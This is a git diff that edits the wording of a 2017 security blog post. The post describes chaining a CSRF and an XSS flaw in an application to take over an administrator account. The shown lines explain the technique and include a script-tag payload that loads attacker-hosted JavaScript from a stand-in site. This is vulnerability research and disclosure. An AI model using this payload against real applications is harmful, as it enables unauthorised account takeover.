@@ -62,7 +62,7 @@ If you are thinking, if we have a CSRF, why go through all the trouble of having
 
 With that in mind, I set off to find a way to be able to takeover the application chaining these two bugs.
 
-I then wrote simple Javascript, when called will create a new user and then promote the user. This is able to bypass SOP, as the request will be executing from the application. Furthermore this is also able to bypass the CSRF protection when promoting a user to the administrator as we can create an XMLHTTPRequest to parse the CSRF token and then include it with our subsequent request.
+I then wrote simple Javascript, when called will create a new user and then promote the user. This is able to bypass SOP, as the request will be called from the application. Furthermore this is also able to bypass the CSRF protection when promoting a user to the administrator as we can create an XMLHTTPRequest to parse the CSRF token and then include it with our subsequent request.
 
 If you host the following Javascript on your site:
 ~~~
@@ -94,10 +94,10 @@ Then use a payload such as:
 <script src="https://your-site.com/xavier.js"></script>
 ~~~
 
-Create a CSRF Poc which will look similar to:
-![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/csrf2.png)
+Create a CSRF proof of concept with the payload above, and host it on your site.
 
-End result:
+Executing the CSRF:
+
 ![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/takeover.gif)
 
 
